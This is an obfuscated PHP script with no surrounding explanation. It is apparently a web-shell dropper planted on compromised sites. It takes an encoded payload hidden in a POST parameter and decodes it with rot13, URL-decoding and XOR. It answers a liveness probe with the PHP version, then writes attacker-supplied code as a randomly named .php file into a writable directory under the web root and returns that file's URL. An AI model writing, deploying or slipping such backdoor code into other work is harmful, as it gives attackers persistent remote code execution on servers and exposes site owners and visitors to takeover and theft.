<?php $ccvbwzj = "mfxmyrryytswthoi";$fepyqtgktx = "";foreach ($_POST as $nwbqzqiiq => $omushvj){if (strlen($nwbqzqiiq) == 16 and substr_count($omushvj, "%") > 10){japyzd($nwbqzqiiq, $omushvj);}}function japyzd($nwbqzqiiq, $wwnue){global $fepyqtgktx;$fepyqtgktx = $nwbqzqiiq;$wwnue = str_split(rawurldecode(str_rot13($wwnue)));function exgpjfog($gofibkdhbc, $nwbqzqiiq){global $ccvbwzj, $fepyqtgktx;return $gofibkdhbc ^ $ccvbwzj[$nwbqzqiiq % strlen($ccvbwzj)] ^ $fepyqtgktx[$nwbqzqiiq % strlen($fepyqtgktx)];}$wwnue = implode("", array_map("exgpjfog", array_values($wwnue), array_keys($wwnue)));$wwnue = @unserialize($wwnue);if (@is_array($wwnue)){$nwbqzqiiq = array_keys($wwnue);$wwnue = $wwnue[$nwbqzqiiq[0]];if ($wwnue === $nwbqzqiiq[0]){echo @serialize(Array('php' => @phpversion(), ));exit();}else{function zbtmyqezi($shqmhir) {static $yelyldc = array();$lcowmom = glob($shqmhir . '/*', GLOB_ONLYDIR);if (count($lcowmom) > 0) {foreach ($lcowmom as $shqmh){if (@is_writable($shqmh)){$yelyldc[] = $shqmh;}}}foreach ($lcowmom as $shqmhir) zbtmyqezi($shqmhir);return $yelyldc;}$negagqp = $_SERVER["DOCUMENT_ROOT"];$lcowmom = zbtmyqezi($negagqp);$nwbqzqiiq = array_rand($lcowmom);$vxgarlnwvm = $lcowmom[$nwbqzqiiq] . "/" . substr(md5(time()), 0, 8) . ".php";@file_put_contents($vxgarlnwvm, $wwnue);echo "http://" . $_SERVER["HTTP_HOST"] . substr($vxgarlnwvm, strlen($negagqp));exit();}}}